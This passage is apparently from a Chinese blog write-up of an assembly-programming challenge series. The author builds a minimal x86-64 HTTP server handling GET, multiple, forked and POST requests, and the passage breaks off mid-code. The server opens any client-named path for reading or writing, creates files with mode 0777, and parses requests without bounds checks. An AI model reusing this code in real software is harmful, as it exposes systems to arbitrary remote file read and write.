class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #SYS_write</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x03</span><br><span class="line">    syscall         #SYS_close</span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<h1 id="level7-Respond-GET"><a href="#level7-Respond-GET" class="headerlink" title="level7 Respond(GET)"></a>level7 Respond(GET)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will respond to a GET request for the contents of a specified file.</span><br></pre></td></tr></table></figure>

<p>本关要求响应对特定文件的请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">[ ] read(5, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(5) = 0</span><br><span class="line">[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>难点在于打开这个随机的文件，要从请求信息中提取这个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rsi, read_buf </span><br><span class="line">add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line"># 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">.find_space:</span><br><span class="line">    cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">    je .found_space</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp .find_space</span><br><span class="line"></span><br><span class="line">.found_space:</span><br><span class="line">    movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br></pre></td></tr></table></figure>

<p><code>read_buf</code>存储的是请求信息整体，跳过<code>GET </code>后找到下一个空格并将他的位置替换为null即可</p>
<p>rdi所指向的地址即是文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:</span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">    filename:</span><br><span class="line">        .asciz &quot;/tmp/build&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line">    file_buf: .space 1024</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #SYS_bind</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #SYS_listen</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #SYS_accept</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #SYS_read</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    lea rsi, read_buf </span><br><span class="line">    add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space</span><br><span class="line">        inc rsi</span><br><span class="line">        jmp .find_space</span><br><span class="line"></span><br><span class="line">    .found_space:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    </span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x2     #SYS_open</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rax,0x0</span><br><span class="line">    syscall         #SYS_read</span><br><span class="line">    mov r13,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #SYS_close</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #SYS_write</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,r13</span><br><span class="line">    mov rax,0x1     #SYS_write</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x03</span><br><span class="line">    syscall         #SYS_close</span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level8-Responds-multiple-GET"><a href="#level8-Responds-multiple-GET" class="headerlink" title="level8 Responds(multiple,GET)"></a>level8 Responds(multiple,GET)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this series of challenges, you will be writing assembly to interact with your environment, and ultimately build a web server</span><br><span class="line">In this challenge you will accept multiple requests.</span><br></pre></td></tr></table></figure>

<p>本关要求动态响应多个HTTP GET 请求</p>
<p>我在accept和exit两个部分分别添加了label，并判断accept是否成功，每次响应结束后继续跳转到accept</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:</span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">    filename:</span><br><span class="line">        .asciz &quot;/tmp/build&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line">    file_buf: .space 1024</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #SYS_bind</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #SYS_listen</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Accept:</span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #SYS_accept</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    cmp r12,0</span><br><span class="line">    jb Exit</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #SYS_read</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    lea rsi, read_buf </span><br><span class="line">    add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space</span><br><span class="line">        inc rsi</span><br><span class="line">        jmp .find_space</span><br><span class="line"></span><br><span class="line">    .found_space:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    </span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x2     #SYS_open</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rax,0x0</span><br><span class="line">    syscall         #SYS_read</span><br><span class="line">    mov r13,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #SYS_close</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #SYS_write</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,r13</span><br><span class="line">    mov rax,0x1     #SYS_write</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x03</span><br><span class="line">    syscall         #SYS_close</span><br><span class="line">    </span><br><span class="line">    jmp Accept</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level9-Responds-multiple-GET-Multi-processed-program"><a href="#level9-Responds-multiple-GET-Multi-processed-program" class="headerlink" title="level9 Responds(multiple,GET,Multi-processed program)"></a>level9 Responds(multiple,GET,Multi-processed program)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will concurrently accept multiple requests.</span><br></pre></td></tr></table></figure>

<p>本关要求多线程程序响应多个请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>程序在accept成功后还会使用fork创建子进程，并使用子进程来处理响应</p>
<p>这里又优化了一下跳转，主进程会跳转回accept，子进程运行后直接exit，进入子进程后需断开和套接字的连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:</span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">    filename:</span><br><span class="line">        .asciz &quot;/tmp/build&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line">    file_buf: .space 1024</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #listen(3, 0) = 0</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">Accept:</span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #accept(3, NULL, NULL) = 4</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    cmp r12,0</span><br><span class="line">    jb Exit</span><br><span class="line">    </span><br><span class="line">    mov rax,0x39</span><br><span class="line">    syscall         #fork() = &lt;fork_result&gt;</span><br><span class="line"></span><br><span class="line">    cmp rax,0</span><br><span class="line">    jz Respond</span><br><span class="line"></span><br><span class="line">Close_Accept:</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x3     </span><br><span class="line">    syscall         #close(4) = 0</span><br><span class="line"></span><br><span class="line">    jmp Accept</span><br><span class="line"></span><br><span class="line">Respond:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    lea rsi, read_buf </span><br><span class="line">    add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space</span><br><span class="line">        inc rsi</span><br><span class="line">        jmp .find_space</span><br><span class="line"></span><br><span class="line">    .found_space:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    </span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x2     #open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rax,0x0</span><br><span class="line">    syscall         #read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov r13,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,r13</span><br><span class="line">    mov rax,0x1     #write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Exit:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     #exit(0) = ?</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level10-Responds-multiple-POST-Multi-processed-program"><a href="#level10-Responds-multiple-POST-Multi-processed-program" class="headerlink" title="level10 Responds(multiple,POST,Multi-processed program)"></a>level10 Responds(multiple,POST,Multi-processed program)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will respond to a POST request with a specified file and update its contents.</span><br></pre></td></tr></table></figure>

<p>本关要求响应POST请求，基于level9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open(&quot;&lt;open_path&gt;&quot;, O_WRONLY|O_CREAT, 0777) = 3</span><br><span class="line">[ ] write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>请求类似如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tmp/tmpe2ptnwku HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: python-requests/2.32.3</span><br><span class="line">Accept-Encoding: gzip, deflate, zstd</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 59</span><br><span class="line">5yIeEBFM2hUqATZSKtQ3rnWXJxdFjMu4RdBbdeBJzu3nIXUdcuKb8dq8zBN</span><br></pre></td></tr></table></figure>

<p>关键在于读取请求文件名和读取请求数据</p>
<p>这里其实数据和前缀之间有两个<code>\r\n</code>可以通过这两个来使寄存器指向数据</p>
<p>文件名直接使用前面用到的方法即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:    </span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">    filename:</span><br><span class="line">        .asciz &quot;/tmp/build&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line">    file_buf: .space 1024</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax    # r10=套接字描述符</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #listen(3, 0) = 0</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">Accept:</span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #accept(3, NULL, NULL) = 4</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    cmp r12,0</span><br><span class="line">    jb Exit</span><br><span class="line">    </span><br><span class="line">    mov rax,0x39</span><br><span class="line">    syscall         #fork() = &lt;fork_result&gt;</span><br><span class="line"></span><br><span class="line">    cmp rax,0</span><br><span class="line">    jz Respond</span><br><span class="line"></span><br><span class="line">Close_Accept:</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x3     </span><br><span class="line">    syscall         #close(4) = 0</span><br><span class="line"></span><br><span class="line">    jmp Accept</span><br><span class="line"></span><br><span class="line">Respond:</span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    syscall </span><br><span class="line">    mov r9,rax</span><br><span class="line"></span><br><span class="line">    mov al,[read_buf]</span><br><span class="line">    cmp al,&#x27;G&#x27;</span><br><span class="line">    je GET</span><br><span class="line"></span><br><span class="line">    cmp al,&#x27;P&#x27;</span><br><span class="line">    je POST</span><br><span class="line"></span><br><span class="line">    jmp Exit</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">extract_post_body:</span><br><span class="line">    lea rsi, read_buf          # 获取请求字符串</span><br><span class="line">    add rsi, 5                  # 跳过 &#x27;POST &#x27;</span><br><span class="line"></span><br><span class="line">    # 查找请求体的起始位置</span><br><span class="line">    xor rcx, rcx               # 清零 rcx，用于计数</span><br><span class="line">.find_double_newline:</span><br><span class="line">    cmpb byte [rsi], 0          # 检查字符串结束</span><br><span class="line">    je .done                     # 如果到达结束，跳转到完成</span><br><span class="line"></span><br><span class="line">    cmpb byte [rsi], 10         # 检查是否为换行符 &#x27;\n&#x27;</span><br><span class="line">    je .check_previous           # 如果找到换行符，检查前一个字符</span><br><span class="line"></span><br><span class="line">    inc rsi                      # 移动到下一个字符</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line"></span><br><span class="line">.check_previous:</span><br><span class="line">    cmpb byte [rsi - 1], 13      # 检查前一个字符是否为回车符 &#x27;\r&#x27;</span><br><span class="line">    je .cmp_more      # 如果找到 &#x27;\r\n&#x27;，跳转</span><br><span class="line"></span><br><span class="line">    inc rsi                      # 移动到下一个字符</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line"></span><br><span class="line">.cmp_more:</span><br><span class="line">    cmpb byte [rsi-2],10</span><br><span class="line">    je .found_double_newline</span><br><span class="line"></span><br><span class="line">    inc rsi</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line">.found_double_newline:</span><br><span class="line">    inc rsi                     # 跳过换行符</span><br><span class="line">    inc rsi</span><br><span class="line">    mov r15, rsi                # r15 现在指向请求体的开始</span><br><span class="line">    jmp .done</span><br><span class="line"></span><br><span class="line">.done:</span><br><span class="line">    # 现在 r15 指向请求体的开始</span><br><span class="line">    # 使用 r9 存储请求体的长度</span><br><span class="line">    lea rax, [read_buf + r9]   # 假设请求体最大长度为 256</span><br><span class="line">    sub rax, r15                 # 计算请求体的长度</span><br><span class="line">    mov r9, rax                  # 将长度存储到 r9 中</span><br><span class="line"></span><br><span class="line">    lea rsi, read_buf       #获取文件名</span><br><span class="line">    add rsi, 5              # 跳过 &#x27;POST &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line"></span><br><span class="line">    xor rcx,rcx             # 文件名长度计数器</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space_P:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space_P</span><br><span class="line">        inc rsi</span><br><span class="line">        inc rcx</span><br><span class="line">        jmp .find_space_P</span><br><span class="line">    .found_space_P:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    mov r13,rcx</span><br><span class="line">    </span><br><span class="line">    mov rsi,0x01 | 0x40</span><br><span class="line">    mov rdx,0777</span><br><span class="line">    mov rax,0x2     #open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">    syscall</span><br><span class="line">    mov r11,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rsi,r15</span><br><span class="line">    mov rdx,r9</span><br><span class="line">    mov rdi,r11</span><br><span class="line">    mov rax,0x1</span><br><span class="line">    syscall         #write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp Exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET:</span><br><span class="line">    lea rsi, read_buf </span><br><span class="line">    add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space</span><br><span class="line">        inc rsi</span><br><span class="line">        jmp .find_space</span><br><span class="line"></span><br><span class="line">    .found_space:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    </span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x2     #open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rax,0x0</span><br><span class="line">    syscall         #read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov r13,rax</span><br><span class="line"></span><br><span 